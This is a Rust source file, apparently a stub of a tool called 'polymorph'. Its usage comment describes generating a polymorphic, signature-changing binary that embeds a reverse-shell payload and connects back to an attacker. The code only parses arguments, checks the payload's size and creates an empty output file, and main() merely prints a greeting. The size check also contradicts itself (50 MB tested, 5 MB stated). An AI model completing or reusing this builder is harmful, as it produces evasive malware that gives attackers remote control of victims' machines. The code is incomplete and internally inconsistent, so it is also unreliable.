mod parser;
mod pkg;
use std::path::PathBuf;

// $> polymorph --help
// Polymorphic Program Usage:
//   --generate <output-binary>       Generate a polymorphic binary.
//   --payload <reverse-shell-code>   Embed the reverse shell payload.
// $> polymorph --generate polymorphic.exe --payload reverse_shell_payload
// Polymorphic binary generated successfully as "polymorphic.exe".
// $> polymorphic.exe
// [INFO] Polymorphic signature updated successfully.
// [INFO] Reverse shell initialized. Attempting connection to attacker...


struct Polymorph {
    output: PathBuf,
    payload: PathBuf,
}   

impl Polymorph {
    fn new(output: PathBuf, payload: PathBuf) -> Self {
        Polymorph {
            output,
            payload,
        }
    }

    fn parse_args() -> Result<Polymorph, String> {
        let args = parser::parser()?;
        let payload = args.payload.ok_or("Reverse shell payload path is required.".to_string())?;
        let metadata = std::fs::metadata(&payload).map_err(|e| format!("Failed to read target binary metadata: {}", e))?;
        let file_size_mb = metadata.len() / (1024 * 1024);

        if file_size_mb > 50 {
            return Err("Reverse shell payload size exceeds the maximum allowed size of 5 MB.".to_string());
        }

        let output = args.output.unwrap_or_else(|| {
        let mut output_path = payload.clone();
        let file_name = output_path.file_name().unwrap_or_default().to_string_lossy();
            output_path.set_file_name(format!("poly_{}", file_name));
            output_path
        });

        std::fs::File::create(&output).map_err(|e| format!("Failed to create output file: {}", e))?;

        Ok(Polymorph::new(output, payload))
    }
}

fn main() {
    println!("Hello, world!");
}
